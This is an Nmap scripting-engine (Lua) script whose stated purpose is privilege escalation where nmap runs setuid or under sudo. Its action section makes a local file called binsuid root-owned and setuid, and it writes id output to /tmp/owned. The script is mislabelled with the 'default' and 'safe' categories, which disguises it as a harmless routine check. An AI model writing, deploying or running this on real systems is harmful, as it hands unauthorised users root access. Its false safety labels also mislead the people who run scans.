-- The Head Section --
description = [[If nmap is suid or you have sudo nmap rights
this script suid a local binary called binsuid]]
author = "0xMitsurugi"
license = "Same as Nmap--See http://nmap.org/book/man-legal.html"
categories = {"default", "safe"}

-- The Rule Section --
hostrule = function(host)
    return host
end

-- The Action Section --
action = function(host)
    os.execute("echo got_root ; id > /tmp/owned")
    os.execute("[ -f binsuid ] && chown root.root binsuid")
    os.execute("[ -f binsuid ] && chmod +s binsuid")
    return "suid nmap priv escalation"
end
